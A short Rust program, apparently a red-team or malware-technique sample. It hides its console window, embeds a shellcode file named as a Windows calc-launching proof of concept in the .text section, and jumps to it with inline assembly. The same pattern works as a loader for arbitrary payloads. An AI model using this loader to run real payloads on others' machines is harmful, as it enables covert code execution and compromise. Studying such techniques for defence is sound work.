#![windows_subsystem = "windows"]

use std::arch::asm;

#[link_section = ".text"]
static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");

#[cfg(target_os = "windows")]
fn main() {
    unsafe {
        asm!(
        "call {}",
        in(reg) SHELLCODE.as_ptr(),
        )
    }
}
